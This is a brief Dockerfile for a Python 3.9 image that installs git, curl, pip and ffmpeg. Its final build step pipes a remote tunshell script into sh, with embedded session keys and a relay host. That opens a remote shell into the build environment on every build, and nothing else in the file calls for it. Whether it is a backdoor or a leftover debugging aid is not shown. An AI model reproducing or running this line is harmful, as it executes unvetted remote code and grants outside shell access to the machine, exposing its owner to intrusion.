FROM python:3.9.7-slim-buster
RUN apt-get update && apt-get upgrade -y
RUN apt-get install git curl python3-pip ffmpeg -y
RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T EtptwAL90NU8i8XbCwWHIY CTsgKPzPjcVWfi26HhhNlv eu.relay.tunshell.com
